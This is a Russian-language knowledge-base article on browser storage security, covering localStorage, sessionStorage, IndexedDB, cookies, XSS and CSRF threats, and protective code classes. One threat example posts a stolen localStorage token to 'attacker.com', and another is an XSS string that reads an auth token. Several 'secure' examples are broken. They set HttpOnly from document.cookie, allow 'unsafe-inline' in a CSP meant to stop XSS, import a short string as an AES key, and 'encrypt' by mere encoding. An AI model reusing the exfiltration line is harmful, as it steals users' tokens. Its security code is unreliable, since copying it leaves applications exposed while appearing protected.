---
aliases: ["Browser Storage Security", "Безопасность хранилища браузера", "Client-Side Storage Security"]
tags: [security, browser-storage, client-side-security, web-security]
---

# Безопасность хранилища браузера

## Обзор

Хранилище браузера (client-side storage) включает в себя различные механизмы, позволяющие веб-приложениям сохранять данные на стороне клиента: localStorage, sessionStorage, IndexedDB, куки и файловую систему. Несмотря на удобство использования, эти механизмы представляют собой потенциальные риски безопасности, особенно при хранении чувствительных данных.

## Типы хранилища браузера

### 1. LocalStorage

LocalStorage позволяет сохранять данные в виде пар ключ-значение, которые сохраняются между сессиями.

```javascript
// Пример использования LocalStorage
localStorage.setItem('username', 'john_doe');
localStorage.setItem('preferences', JSON.stringify({theme: 'dark', lang: 'ru'}));

const username = localStorage.getItem('username');
const preferences = JSON.parse(localStorage.getItem('preferences'));
```

**Ограничения безопасности:**
- Данные доступны всем скриптам на том же домене
- Подвержены XSS-атакам
- Не защищены от доступа вредоносных расширений браузера

### 2. SessionStorage

SessionStorage работает аналогично LocalStorage, но данные удаляются при закрытии вкладки/браузера.

```javascript
// Пример использования SessionStorage
sessionStorage.setItem('tempData', 'temporary value');
sessionStorage.removeItem('tempData');
sessionStorage.clear(); // Очистка всех данных сессии
```

### 3. IndexedDB

Более сложная система хранения данных, позволяющая хранить структурированные данные и файлы.

```javascript
// Пример использования IndexedDB
function openDatabase() {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open('MyAppDB', 1);
    
    request.onerror = () => reject(request.error);
    request.onsuccess = () => resolve(request.result);
    
    request.onupgradeneeded = (event) => {
      const db = event.target.result;
      
      // Создание хранилища объектов
      if (!db.objectStoreNames.contains('users')) {
        const objectStore = db.createObjectStore('users', { keyPath: 'id' });
        objectStore.createIndex('email', 'email', { unique: true });
      }
    };
  });
}

async function saveUserData(userData) {
  const db = await openDatabase();
  const transaction = db.transaction(['users'], 'readwrite');
  const store = transaction.objectStore('users');
  
  return new Promise((resolve, reject) => {
    const request = store.put(userData);
    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
}
```

### 4. Куки (Cookies)

Куки - это небольшие фрагменты данных, отправляемые веб-сервером и хранимые в браузере.

```javascript
// Пример установки куки с параметрами безопасности
document.cookie = "sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/";

// Установка куки через сервер (Express.js)
app.get('/set-cookie', (req, res) => {
  res.cookie('authToken', 'token-value', {
    httpOnly: true,      // Защита от XSS
    secure: true,        // Только по HTTPS
    sameSite: 'strict',  // Защита от CSRF
    maxAge: 24 * 60 * 60 * 1000 // 24 часа
  });
  
  res.send('Куки установлены');
});
```

## Угрозы безопасности хранилища

### 1. Межсайтовый скриптинг (XSS)

XSS-атаки позволяют вредоносному скрипту получить доступ ко всем данным в хранилище браузера.

```javascript
// Пример уязвимости XSS
// Если приложение отображает пользовательский ввод без санитизации:
const userInput = '<script>localStorage.getItem("authToken")</script>';
document.getElementById('output').innerHTML = userInput; // Уязвимость!

// Защита: всегда санитизировать вывод
function safeOutput(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}
```

### 2. Атаки на куки

Куки могут быть украдены или подделаны, если не используются правильные параметры безопасности.

```javascript
// НЕБЕЗОПАСНО
document.cookie = "authToken=secret-token";

// БЕЗОПАСНО
document.cookie = "authToken=secret-token; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600";
```

### 3. Атаки на локальное хранилище

Вредоносные скрипты могут изменять или извлекать данные из локального хранилища.

```javascript
// Пример атаки на localStorage
// Вредоносный скрипт может выполнить:
const sensitiveData = localStorage.getItem('userToken');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: sensitiveData })
});
```

## Лучшие практики безопасности хранилища

### 1. Шифрование чувствительных данных

```javascript
// Пример шифрования данных перед сохранением в хранилище
class SecureStorage {
  constructor(key) {
    this.encryptionKey = key;
  }
  
  async encrypt(data) {
    const encodedData = new TextEncoder().encode(JSON.stringify(data));
    const iv = crypto.getRandomValues(new Uint8Array(12));
    
    const key = await this.importKey(this.encryptionKey);
    const encrypted = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv },
      key,
      encodedData
    );
    
    // Возвращаем зашифрованные данные с IV
    return {
      encrypted: Array.from(new Uint8Array(encrypted)),
      iv: Array.from(iv)
    };
  }
  
  async decrypt(encryptedData) {
    const key = await this.importKey(this.encryptionKey);
    const decrypted = await crypto.subtle.decrypt(
      { name: 'AES-GCM', iv: new Uint8Array(encryptedData.iv) },
      key,
      new Uint8Array(encryptedData.encrypted)
    );
    
    const decoder = new TextDecoder();
    return JSON.parse(decoder.decode(decrypted));
  }
  
  async importKey(keyString) {
    const keyBuffer = new TextEncoder().encode(keyString);
    return await crypto.subtle.importKey(
      'raw',
      keyBuffer,
      { name: 'AES-GCM' },
      false,
      ['encrypt', 'decrypt']
    );
  }
  
  async setItem(key, value) {
    const encrypted = await this.encrypt(value);
    localStorage.setItem(key, JSON.stringify(encrypted));
  }
  
  async getItem(key) {
    const encryptedData = localStorage.getItem(key);
    if (!encryptedData) return null;
    
    return await this.decrypt(JSON.parse(encryptedData));
  }
}

// Использование
const secureStorage = new SecureStorage('my-secret-key');
await secureStorage.setItem('userToken', { token: 'secret-token', userId: 123 });
const tokenData = await secureStorage.getItem('userToken');
```

### 2. Санитизация и валидация данных

```javascript
// Класс безопасного хранилища с валидацией
class ValidatedStorage {
  constructor() {
    this.allowedKeys = new Set(['userPreferences', 'theme', 'language']);
    this.maxSize = 1024 * 10; // 10KB
  }
  
  setItem(key, value) {
    // Проверка разрешенного ключа
    if (!this.allowedKeys.has(key)) {
      throw new Error(`Ключ ${key} не разрешен для сохранения`);
    }
    
    // Проверка размера данных
    const serializedValue = JSON.stringify(value);
    if (serializedValue.length > this.maxSize) {
      throw new Error(`Данные слишком большие для ключа ${key}`);
    }
    
    // Санитизация данных
    const sanitizedValue = this.sanitize(value);
    
    // Сохранение
    localStorage.setItem(key, JSON.stringify(sanitizedValue));
  }
  
  getItem(key) {
    const value = localStorage.getItem(key);
    if (value === null) return null;
    
    try {
      return JSON.parse(value);
    } catch (e) {
      console.error(`Ошибка при парсинге данных для ключа ${key}:`, e);
      return null;
    }
  }
  
  sanitize(data) {
    // Рекурсивная санитизация данных
    if (typeof data === 'string') {
      // Удаление потенциально опасных символов
      return data.replace(/[<>'"&]/g, '');
    } else if (Array.isArray(data)) {
      return data.map(item => this.sanitize(item));
    } else if (typeof data === 'object' && data !== null) {
      const sanitized = {};
      for (const [key, value] of Object.entries(data)) {
        sanitized[key] = this.sanitize(value);
      }
      return sanitized;
    }
    return data;
  }
}
```

### 3. Использование HTTP-заголовков безопасности

```javascript
// Настройка заголовков безопасности для защиты хранилища
app.use((req, res, next) => {
  // Content Security Policy для предотвращения XSS
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; " +
    "script-src 'self' 'unsafe-inline'; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "frame-ancestors 'none';"
  );
  
  // Защита от кликджекинга
  res.setHeader('X-Frame-Options', 'DENY');
  
  // Запрет MIME-type sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // XSS Protection
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  next();
});
```

### 4. Правильное использование куки

```javascript
// Безопасная установка куки
app.use((req, res, next) => {
  // Установка безопасных параметров куки
  res.cookie('sessionId', generateSecureToken(), {
    httpOnly: true,      // Недоступно из JavaScript
    secure: true,        // Только по HTTPS
    sameSite: 'strict',  // Защита от CSRF
    path: '/',           // Ограничение области действия
    maxAge: 24 * 60 * 60 * 1000 // Время жизни 24 часа
  });
  
  next();
});

// Генерация безопасного токена
function generateSecureToken() {
  return crypto.randomBytes(32).toString('hex');
}
```

## Практические примеры безопасного использования хранилища

### 1. Безопасное хранение токенов аутентификации

```javascript
// Класс для безопасного управления токенами
class SecureTokenManager {
  constructor() {
    this.tokenKey = 'auth_token';
    this.refreshTokenKey = 'refresh_token';
    this.encryptionKey = this.generateEncryptionKey();
  }
  
  generateEncryptionKey() {
    // В реальном приложении ключ должен быть получен из безопасного источника
    return 'generated-key-based-on-user-session';
  }
  
  async storeTokens(accessToken, refreshToken) {
    // Шифрование токенов перед сохранением
    const encryptedAccessToken = await this.encrypt(accessToken);
    const encryptedRefreshToken = await this.encrypt(refreshToken);
    
    // Сохранение в sessionStorage для дополнительной безопасности
    sessionStorage.setItem(this.tokenKey, JSON.stringify(encryptedAccessToken));
    sessionStorage.setItem(this.refreshTokenKey, JSON.stringify(encryptedRefreshToken));
  }
  
  async getAccessToken() {
    const encryptedToken = sessionStorage.getItem(this.tokenKey);
    if (!encryptedToken) return null;
    
    try {
      const parsed = JSON.parse(encryptedToken);
      return await this.decrypt(parsed);
    } catch (e) {
      console.error('Ошибка при получении токена:', e);
      this.clearTokens();
      return null;
    }
  }
  
  clearTokens() {
    sessionStorage.removeItem(this.tokenKey);
    sessionStorage.removeItem(this.refreshTokenKey);
  }
  
  async encrypt(data) {
    // Реализация шифрования (упрощенная)
    const encoder = new TextEncoder();
    const encoded = encoder.encode(data);
    
    // В реальном приложении использовать криптографические методы
    return {
      data: Array.from(encoded),
      timestamp: Date.now()
    };
  }
  
  async decrypt(encryptedData) {
    // Реализация дешифрования (упрощенная)
    const decoder = new TextDecoder();
    return decoder.decode(new Uint8Array(encryptedData.data));
  }
  
  // Проверка срока действия токена
  isTokenValid() {
    const token = sessionStorage.getItem(this.tokenKey);
    if (!token) return false;
    
    try {
      const parsed = JSON.parse(token);
      // Проверка времени жизни (в реальном приложении токен будет содержать время жизни)
      return Date.now() - parsed.timestamp < 3600000; // 1 час
    } catch (e) {
      return false;
    }
  }
}

// Использование
const tokenManager = new SecureTokenManager();
```

### 2. Защита данных пользователя

```javascript
// Класс для безопасного хранения пользовательских данных
class SecureUserDataStorage {
  constructor(userId) {
    this.userId = userId;
    this.storagePrefix = `user_${userId}_`;
  }
  
  setData(key, value, options = {}) {
    const storageKey = this.storagePrefix + key;
    
    // Проверка на чувствительные данные
    if (this.containsSensitiveData(value)) {
      console.warn('Попытка сохранить чувствительные данные в клиентском хранилище');
      return false;
    }
    
    // Добавление метаданных безопасности
    const dataToStore = {
      value: value,
      timestamp: Date.now(),
      userId: this.userId,
      ...options
    };
    
    try {
      localStorage.setItem(storageKey, JSON.stringify(dataToStore));
      return true;
    } catch (e) {
      console.error('Ошибка при сохранении данных:', e);
      return false;
    }
  }
  
  getData(key) {
    const storageKey = this.storagePrefix + key;
    const stored = localStorage.getItem(storageKey);
    
    if (!stored) return null;
    
    try {
      const parsed = JSON.parse(stored);
      
      // Проверка срока действия, если указано
      if (parsed.expires && Date.now() > parsed.expires) {
        localStorage.removeItem(storageKey);
        return null;
      }
      
      return parsed.value;
    } catch (e) {
      console.error('Ошибка при получении данных:', e);
      return null;
    }
  }
  
  containsSensitiveData(data) {
    const sensitivePatterns = [
      /password/i,
      /token/i,
      /key/i,
      /secret/i,
      /credit.*card/i,
      /ssn|social.*security/i
    ];
    
    const dataStr = JSON.stringify(data).toLowerCase();
    return sensitivePatterns.some(pattern => pattern.test(dataStr));
  }
  
  clearUserData() {
    // Удаление всех данных пользователя
    Object.keys(localStorage)
      .filter(key => key.startsWith(this.storagePrefix))
      .forEach(key => localStorage.removeItem(key));
  }
}
```

### 3. Мониторинг доступа к хранилищу

```javascript
// Класс для мониторинга и аудита доступа к хранилищу
class StorageMonitor {
  constructor() {
    this.accessLog = [];
    this.setupMonitoring();
  }
  
  setupMonitoring() {
    // Мониторинг изменений в localStorage
    const originalSetItem = Storage.prototype.setItem;
    const originalGetItem = Storage.prototype.getItem;
    const originalRemoveItem = Storage.prototype.removeItem;
    
    const self = this;
    
    Storage.prototype.setItem = function(key, value) {
      self.logAccess('set', key, value);
      return originalSetItem.apply(this, arguments);
    };
    
    Storage.prototype.getItem = function(key) {
      const value = originalGetItem.apply(this, arguments);
      self.logAccess('get', key, value);
      return value;
    };
    
    Storage.prototype.removeItem = function(key) {
      self.logAccess('remove', key, null);
      return originalRemoveItem.apply(this, arguments);
    };
  }
  
  logAccess(operation, key, value) {
    // Проверка на чувствительные ключи
    const sensitiveKeys = ['token', 'password', 'secret', 'key', 'auth'];
    const isSensitive = sensitiveKeys.some(sensitive => 
      key.toLowerCase().includes(sensitive)
    );
    
    const logEntry = {
      timestamp: new Date().toISOString(),
      operation,
      key,
      isSensitive,
      source: this.getCurrentScriptSource(),
      userAgent: navigator.userAgent
    };
    
    this.accessLog.push(logEntry);
    
    // Отправка подозрительных действий (опционально)
    if (isSensitive) {
      this.reportSensitiveAccess(logEntry);
    }
  }
  
  getCurrentScriptSource() {
    try {
      throw new Error();
    } catch (e) {
      // Получение стека вызовов для определения источника
      const stack = e.stack;
      const matches = stack.match(/(https?:\/\/[^\s)]+:\d+:\d+)/);
      return matches ? matches[1] : 'unknown';
    }
  }
  
  reportSensitiveAccess(logEntry) {
    // В реальном приложении отправка в систему мониторинга
    console.warn('Подозрительный доступ к чувствительным данным:', logEntry);
    
    // Пример отправки в систему аудита
    if (window.analytics) {
      window.analytics.track('sensitive_storage_access', logEntry);
    }
  }
  
  getAccessLog() {
    return this.accessLog;
  }
  
  clearLog() {
    this.accessLog = [];
  }
}

// Инициализация мониторинга
const storageMonitor = new StorageMonitor();
```

## Защита от конкретных атак

### 1. Защита от XSS-атак

```javascript
// Система защиты от XSS при работе с хранилищем
class XSSProtection {
  static sanitizeInput(input) {
    if (typeof input !== 'string') {
      return input;
    }
    
    // Удаление потенциально опасных тегов и атрибутов
    return input
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
      .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '')
      .replace(/javascript:/gi, '')
      .replace(/on\w+\s*=/gi, '');
  }
  
  static validateStorageKey(key) {
    // Проверка ключа на безопасность
    const safeKeyPattern = /^[a-zA-Z0-9_-]{1,50}$/;
    return safeKeyPattern.test(key);
  }
  
  static secureSetItem(key, value) {
    if (!this.validateStorageKey(key)) {
      throw new Error('Небезопасный ключ хранилища');
    }
    
    const sanitizedValue = this.sanitizeInput(value);
    localStorage.setItem(key, sanitizedValue);
  }
  
  static secureGetItem(key) {
    if (!this.validateStorageKey(key)) {
      throw new Error('Небезопасный ключ хранилища');
    }
    
    return localStorage.getItem(key);
  }
}
```

### 2. Защита от CSRF-атак через куки

```javascript
// Система защиты куки от CSRF
class CookieCSRFProtection {
  static async setSecureCookie(name, value, options = {}) {
    // Генерация CSRF-токена
    const csrfToken = await this.generateCSRFToken();
    
    // Установка куки с токеном
    document.cookie = `${name}=${encodeURIComponent(value)}; ` +
                     `Secure; HttpOnly; SameSite=Strict; ` +
                     `Path=${options.path || '/'}; ` +
                     `Max-Age=${options.maxAge || 3600}`;
    
    // Сохранение токена в безопасном месте
    sessionStorage.setItem('csrf_token', csrfToken);
  }
  
  static async generateCSRFToken() {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
  }
  
  static validateCSRFToken(requestToken) {
    const storedToken = sessionStorage.getItem('csrf_token');
    return storedToken && requestToken === storedToken;
  }
}
```

## Лучшие практики и рекомендации

### 1. Минимизация хранения чувствительных данных

- Не храните пароли, ключи API, токены доступа в клиентском хранилище
- Используйте серверное хранилище для чувствительных данных
- Используйте короткоживущие токены в клиентском хранилище

### 2. Регулярная очистка данных

```javascript
// Система автоматической очистки устаревших данных
class StorageCleanup {
  static cleanupExpiredData() {
    const now = Date.now();
    const keysToRemove = [];
    
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      
      try {
        const parsed = JSON.parse(value);
        if (parsed.expires && now > parsed.expires) {
          keysToRemove.push(key);
        }
      } catch (e) {
        // Пропускаем непарсингуемые данные
      }
    }
    
    keysToRemove.forEach(key => localStorage.removeItem(key));
  }
  
  static scheduleCleanup() {
    // Очистка при загрузке страницы
    this.cleanupExpiredData();
    
    // Периодическая очистка
    setInterval(() => {
      this.cleanupExpiredData();
    }, 30 * 60 * 1000); // Каждые 30 минут
  }
}

StorageCleanup.scheduleCleanup();
```

### 3. Использование безопасных библиотек

```javascript
// Пример использования библиотеки для безопасного хранения
// Вместо использования чистого localStorage, можно использовать обертки

// secure-ls - библиотека для шифрования localStorage
// npm install secure-ls

import SecureLS from 'secure-ls';

const options = {
  encodingType: 'aes',
  encryptionSecret: 'my-secret-key'
};

const secureStorage = new SecureLS(options);

// Безопасное хранение
secureStorage.set('sensitive-data', { token: 'secret-token' });

// Безопасное извлечение
const data = secureStorage.get('sensitive-data');
```

## Заключение

Безопасность хранилища браузера требует комплексного подхода, включающего шифрование, валидацию, мониторинг и правильное использование доступных механизмов. Понимание потенциальных угроз и применение соответствующих мер защиты помогает защитить чувствительные данные пользователей и обеспечить безопасность веб-приложений.

## Связанные темы

- [[Функции-безопасности-браузера]]
- [[Кодирование-вывода]]
- [[Проверка-ввода]]
- [[Лучшие-практики-безопасности-API]]
- [[Тестирование-безопасности]]
- [[Проверка-форм]]